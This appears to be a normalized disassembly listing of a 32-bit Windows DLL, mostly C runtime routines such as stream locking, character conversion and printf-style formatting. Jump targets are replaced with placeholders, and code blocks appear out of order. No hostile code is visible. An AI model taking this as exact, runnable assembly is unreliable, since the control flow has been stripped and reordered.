movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_10026a24
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_10017e85
mov [ eax ] 0x9
call sub_10017e98
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_1002305b
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10023824
mov eax [ ebp - 0x1c ]
sub_1002382c
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_10019dfb
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_10023875
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_10017e85
mov [ eax ] 0x9
call sub_10017e85
mov [ eax ] 0x9
call sub_1001b8e4
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
xor eax eax
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop ebp
retn
sub_100238d1
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_10019e40
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_10019e40
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_100239a2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_1001fd54
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_100239e3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_1001fd54
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_10023a15
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_1001fc7b
pop ecx
pop ebp
retn
sub_10023a51
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_1001fc7b
pop ecx
pop ebp
retn
sub_10023a80
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_10017e85
mov [ eax ] 0x16
call sub_1001b8e4
or eax 0xffffffff
pop ebp
retn
sub_10023abc
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_100176e6
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_10017e85
push 0x16
pop esi
mov [ eax ] esi
call sub_1001b8e4
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_10017e85
mov [ eax ] 0x2a
call sub_10017e85
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_10017e85
push 0x22
pop esi
mov [ eax ] esi
call sub_1001b8e4
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_1001b6e0
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_1001b6e0
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_10023c2e
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_1001b926
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_10023c61
mov edi edi
push ebp
mov ebp esp
push ecx
test [ ebx + 0xc ] 0x40
push esi
mov esi eax
mov eax [ edi ]
mov [ ebp - 0x4 ] eax
je r-xdata
and [ edi ] 0x0
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov al [ eax ]
dec [ ebp + 0xc ]
mov ecx ebx
call sub_10023c2e
inc [ ebp + 0x8 ]
cmp [ esi ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0xc ]
add [ esi ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp [ edi ] 0x2a
jne r-xdata
pop esi
leave
retn
cmp [ edi ] 0x0
jne r-xdata
mov ecx ebx
mov al 0x3f
call sub_10023c2e
sub_10023cc3
mov edi edi
push ebp
mov ebp esp
sub esp 0x280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x254 ]
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x23c ] eax
call sub_100176e6
call sub_10017e85
mov [ ebp - 0x264 ] eax
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_10017e85
mov [ eax ] 0x16
call sub_1001b8e4
cmp [ ebp - 0x248 ] 0x0
je r-xdata
xor esi esi
cmp ebx esi
je r-xdata
push esi
call sub_10023a80
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x24c ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x224 ] esi
mov [ ebp - 0x228 ] esi
mov [ ebp - 0x244 ] esi
mov [ ebp - 0x260 ] esi
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10016ec3
leave
retn
cmp [ ebp - 0x248 ] 0x0
je r-xdata
inc ebx
mov [ ebp - 0x240 ] ebx
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x24c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x244 ] 0x0
je r-xdata
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp [ ebp - 0x244 ] 0x7
jne r-xdata
xor eax eax
movsx eax dl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
push 0x7
pop ecx
cmp eax ecx
ja r-xdata
mov ecx [ ebp - 0x244 ]
imul eax eax 0x9
movzx eax [ eax + ecx + r--data ]
push 0x8
shr eax 0x4
pop esi
mov [ ebp - 0x244 ] eax
cmp eax esi
je r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ebx [ ebp - 0x240 ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + jump_table_100248d7 ]
mov edi [ ebp - 0x21c ]
xor esi esi
mov dl al
jmp r-xdata
xor eax eax
or [ ebp - 0x218 ] 0xffffffff
mov [ ebp - 0x274 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x23c ] eax
jmp r-xdata
movsx eax dl
sub eax 0x20
je r-xdata
cmp dl 0x2a
jne r-xdata
and [ ebp - 0x218 ] 0x0
jmp r-xdata
cmp dl 0x2a
jne r-xdata
cmp dl 0x49
je r-xdata
and [ ebp - 0x23c ] 0x0
lea eax [ ebp - 0x254 ]
push eax
movzx eax dl
push eax
call sub_100229ce
pop ecx
test eax eax
mov al [ ebp - 0x211 ]
pop ecx
je r-xdata
movsx eax dl
cmp eax 0x64
jg r-xdata
or [ ebp - 0x210 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x238 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x238 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x238 ] edi
test edi edi
jns r-xdata
mov eax [ ebp - 0x218 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x218 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x218 ] edi
test edi edi
jns r-xdata
mov al [ ebx ]
cmp al 0x36
jne r-xdata
cmp dl 0x68
je r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
call sub_10023c2e
jmp r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
call sub_10023c2e
mov al [ ebx ]
inc ebx
mov [ ebp - 0x240 ] ebx
test al al
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x80
jmp r-xdata
sub eax esi
je r-xdata
or [ ebp - 0x210 ] 0x4
neg [ ebp - 0x238 ]
jmp r-xdata
or [ ebp - 0x218 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
cmp [ ebx + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x210 ] 0x20
jmp r-xdata
cmp dl 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x210 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
cmp [ ebx + 0x1 ] 0x32
jne r-xdata
add ebx 0x2
or [ ebp - 0x210 ] 0x8000
mov [ ebp - 0x240 ] ebx
jmp r-xdata
cmp [ ebx ] 0x6c
jne r-xdata
cmp dl 0x77
jne r-xdata
mov ecx [ ebp - 0x218 ]
cmp ecx 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x218 ] esi
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
add edi esi
mov eax [ edi - 0x8 ]
mov edx [ edi - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al 0x69
je r-xdata
add ebx 0x2
and [ ebp - 0x210 ] 0xffff7fff
mov [ ebp - 0x240 ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x10
jmp r-xdata
inc ebx
or [ ebp - 0x210 ] 0x1000
mov [ ebp - 0x240 ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x220 ] edi
je r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x228 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x228 ] 0x10
je r-xdata
cmp [ ebp - 0x25c ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x258 ] ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x210 ] esi
jmp r-xdata
cmp al 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov edi [ ebp - 0x21c ]
mov [ ebp - 0x258 ] 0x27
mov ecx [ ebp - 0x210 ]
test ecx 0x8000
je r-xdata
mov al [ ebp - 0x258 ]
add al 0x51
mov [ ebp - 0x22c ] 0x30
mov [ ebp - 0x22b ] al
mov [ ebp - 0x234 ] 0x2
jmp r-xdata
cmp [ ebp - 0x260 ] 0x0
je r-xdata
mov ecx [ ebp - 0x210 ]
test cl 0x40
je r-xdata
mov edi [ ebp - 0x21c ]
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x21c ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x210 ] 0x9000
mov edi edx
mov ebx eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x21c ] edi
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x210 ] 0x800
add dl 0x20
mov [ ebp - 0x274 ] 0x1
mov [ ebp - 0x211 ] dl
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax [ ebp - 0x220 ]
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x220 ] eax
mov eax [ ebp - 0x220 ]
mov [ ebp - 0x23c ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x220 ] eax
push [ ebp - 0x260 ]
call sub_1001750d
and [ ebp - 0x260 ] 0x0
pop ecx
mov eax [ ebp - 0x238 ]
sub eax [ ebp - 0x228 ]
sub eax [ ebp - 0x234 ]
mov [ ebp - 0x268 ] eax
test cl 0xc
jne r-xdata
test ecx 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x218 ] 0x6
jmp r-xdata
mov edi [ ebp - 0x21c ]
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x218 ] 0x0
jge r-xdata
xor edi edi
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x220 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp [ ebp - 0x218 ] 0x0
lea ebx [ ebp - 0x20c ]
mov eax 0x200
mov [ ebp - 0x220 ] ebx
mov [ ebp - 0x268 ] eax
jge r-xdata
dec eax
dec eax
jne r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
push [ ebp - 0x234 ]
mov edi [ ebp - 0x264 ]
mov ebx [ ebp - 0x230 ]
lea eax [ ebp - 0x22c ]
push eax
lea eax [ ebp - 0x224 ]
call sub_10023c61
test [ ebp - 0x210 ] 0x8
pop ecx
pop ecx
je r-xdata
mov edi eax
jmp r-xdata
test cl 0x1
je r-xdata
mov [ ebp - 0x22c ] 0x2d
jmp r-xdata
cmp [ ebp - 0x218 ] eax
jle r-xdata
cmp dl 0x67
jne r-xdata
mov eax [ edi ]
mov esi [ DecodePointer@IAT ]
add edi 0x8
mov [ ebp - 0x280 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x27c ] eax
lea eax [ ebp - 0x254 ]
push eax
push [ ebp - 0x274 ]
movsx eax dl
push [ ebp - 0x218 ]
mov [ ebp - 0x21c ] edi
push eax
push [ ebp - 0x268 ]
lea eax [ ebp - 0x280 ]
push ebx
push eax
push [ rw-data ]
call esi
call eax
mov edi [ ebp - 0x210 ]
add esp 0x1c
and edi 0x80
je r-xdata
add [ ebp - 0x21c ] 0x4
mov eax [ ebp - 0x21c ]
mov esi [ eax - 0x4 ]
call sub_10023aa6
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x210 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x218 ] eax
jle r-xdata
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x210 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x228 ] eax
test [ ebp - 0x210 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x220 ] ecx
je r-xdata
mov edi [ ebp - 0x21c ]
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x21c ] edi
je r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x220 ]
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x220 ]
sar eax 0x1
jmp r-xdata
cmp [ ebp - 0x23c ] 0x0
mov eax [ ebp - 0x228 ]
je r-xdata
test [ ebp - 0x210 ] 0x4
jne r-xdata
test edi edi
jg r-xdata
test cl 0x2
je r-xdata
mov [ ebp - 0x22c ] 0x2b
jmp r-xdata
mov [ ebp - 0x234 ] 0x1
cmp [ ebp - 0x218 ] 0xa3
jle r-xdata
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
cmp [ ebp - 0x211 ] 0x67
jne r-xdata
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
test [ ebp - 0x210 ] 0x20
je r-xdata
test [ ebp - 0x210 ] 0x80
mov edi [ ebp - 0x21c ]
mov [ ebp - 0x228 ] esi
je r-xdata
mov eax ebx
or eax edi
jne r-xdata
mov [ ebp - 0x218 ] eax
and [ ebp - 0x23c ] 0x0
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x23c ] 0x1
jmp r-xdata
mov al [ edi - 0x4 ]
mov [ ebp - 0x20c ] al
mov [ ebp - 0x228 ] 0x1
movzx eax [ edi - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x228 ]
push eax
call sub_10023c11
add esp 0x10
test eax eax
je r-xdata
and [ ebp - 0x244 ] 0x0
inc eax
add eax 0x2
mov edi [ ebp - 0x264 ]
push eax
push [ ebp - 0x220 ]
lea eax [ ebp - 0x224 ]
call sub_10023c61
pop ecx
pop ecx
test eax eax
jle r-xdata
mov edi [ ebp - 0x268 ]
jmp r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
mov al 0x20
dec edi
call sub_10023c2e
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
mov [ ebp - 0x22c ] 0x20
mov esi [ ebp - 0x218 ]
add esi 0x15d
push esi
call sub_10019dfb
mov dl [ ebp - 0x211 ]
pop ecx
mov [ ebp - 0x260 ] eax
test eax eax
je r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x254 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x224 ]
mov [ esi ] eax
mov ax [ ebp - 0x224 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x210 ] 0x200
jmp r-xdata
lea esi [ ebp - 0xd ]
and [ ebp - 0x234 ] eax
lea eax [ ebp - 0x20c ]
mov [ ebp - 0x220 ] eax
jmp r-xdata
mov [ ebp - 0x25c ] 0x1
jmp r-xdata
test [ ebp - 0x210 ] 0x4
je r-xdata
mov esi [ ebp - 0x220 ]
mov [ ebp - 0x270 ] eax
test edi edi
jg r-xdata
mov [ ebp - 0x218 ] 0xa3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x268 ] esi
mov ebx eax
jmp r-xdata
push ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x100
inc ebx
mov [ ebp - 0x220 ] ebx
lea eax [ ebp - 0x254 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x25c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x228 ]
cdq
push edx
push eax
push edi
push ebx
call sub_10021bf0
add ecx 0x30
mov [ ebp - 0x268 ] ebx
mov ebx eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ebx
or eax edi
je r-xdata
mov edi [ ebp - 0x268 ]
jmp r-xdata
or [ ebp - 0x224 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x278 ] eax
je r-xdata
lea esi [ ebp - 0x224 ]
mov ecx ebx
mov al 0x30
dec edi
call sub_10023c2e
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
call sub_10018330
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x258 ]
lea eax [ ebp - 0xd ]
sub eax esi
inc esi
test [ ebp - 0x210 ] 0x200
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x220 ] esi
je r-xdata
test edi edi
jg r-xdata
cmp [ ebp - 0x224 ] 0x0
jl r-xdata
push [ ebp - 0x278 ]
mov edi [ ebp - 0x264 ]
mov ebx [ ebp - 0x230 ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x224 ]
call sub_10023c61
cmp [ ebp - 0x270 ] 0x0
pop ecx
pop ecx
jne r-xdata
mov eax [ ebp - 0x218 ]
dec [ ebp - 0x218 ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
mov al 0x20
dec edi
call sub_10023c2e
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
movzx eax [ esi ]
dec [ ebp - 0x270 ]
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x278 ]
push eax
add esi 0x2
call sub_10023c11
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec [ ebp - 0x220 ]
mov ecx [ ebp - 0x220 ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_100248f7
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax 0xffff
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
movzx eax [ ebp - 0x4 ]
and [ ebp - 0x4 ] eax
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
sub_10024960
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_100249a0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_100249f0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_1001ded0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_10024960
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_100249a0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10024aac
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_100176e6
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
